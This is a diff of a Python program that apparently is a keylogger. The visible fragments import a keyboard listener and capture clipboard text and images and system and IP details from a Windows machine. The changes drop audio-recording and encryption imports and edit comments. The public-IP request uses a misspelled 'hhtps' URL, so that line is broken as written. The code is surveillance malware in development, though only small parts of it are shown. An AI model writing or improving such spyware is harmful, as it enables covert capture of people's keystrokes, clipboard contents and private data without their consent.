@@ -10,9 +10,6 @@ import win32clipboard
 from pynput.keyboard import Key, Listener
 import time
 import os
-from scipy.io.wavfile import write
-import sounddevice as sd
-from cryptography.fernet import Fernet  
 import getpass
 from requests import get
 from multiprocessing import Process, freeze_support
@@ -79,7 +76,7 @@ def comp_info():
         IPAddr = socket.gethostbyname(hostname)
         # trying to get Public IP(doesn't work)
         try: 
-            public_IP = get("hhtps://api.ipify.org").text
+            public_IP = get("hhtps://api.ipify.org").text # service is down
             s_info.write("Public IP address: "+ public_IP+"\n")
         except Exception:
             s_info.write("Couldn't access public IP"+"\n")
@@ -102,7 +99,7 @@ def copy_clipboard():
         except:
             c_info.write("Clipboard couldn't be pasted(Might not be a text)")
 
-        # If image is coppied
+        # If an image is copied
         image = ImageGrab.grabclipboard()
         if isinstance(image, Image.Image):
             image.save(file_path+extend+"clipboard_image.png")
